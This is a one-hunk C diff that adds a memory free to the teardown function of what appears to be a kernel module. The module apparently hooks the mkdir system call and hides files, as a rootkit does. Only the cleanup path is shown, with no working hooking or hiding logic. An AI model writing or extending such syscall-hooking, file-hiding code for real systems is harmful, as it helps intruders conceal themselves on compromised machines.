@@ -60,6 +60,7 @@ die(void)
 {
 	/* Disable interface. */
 	hook_set(sys_mkdir, mkdir_prepatch);
+	free(mkdir_prepatch, M_TEMP);
 
 	/* Unhide files. */
 	unhide_files();
